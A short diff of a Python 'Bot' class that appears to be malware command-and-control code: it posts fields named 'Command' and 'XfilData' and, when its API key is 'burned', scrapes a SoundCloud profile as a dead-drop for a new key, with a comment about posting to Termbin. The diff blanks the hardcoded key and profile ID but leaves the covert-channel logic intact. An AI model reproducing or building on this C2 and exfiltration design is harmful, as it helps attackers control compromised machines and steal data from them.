@@ -36,7 +36,7 @@ def decrypt(msg):
 
 class Bot:
     def __init__(self):
-        self.apiKey = "1031bab2ce2395cb86acee82de84cec0"
+        self.apiKey = ""
         self.postData = {"UID": "", "Command": "", "XfilData": "", "Time": ""}
         self.oldSongs = []
 
@@ -50,8 +50,8 @@ class Bot:
         while r.status_code >= 400 and r.status_code <= 499:
             # API Key has been burned, need a new one
             # Post to Termbin, wait hr, query account, If new key found, set self.apiKey. Else repeat(Done in main)
-            user = "user-447310327-528627001/"
-            r = requests.get("https://soundcloud.com/user-447310327-528627001")
+            user = "/"
+            r = requests.get("https://soundcloud.com/{}".format(user))
             found = r.text.find(user)
 
             newKey = r.text[r.text.find('>', found+len(user))+1:r.text.find('<', found+len(user))]
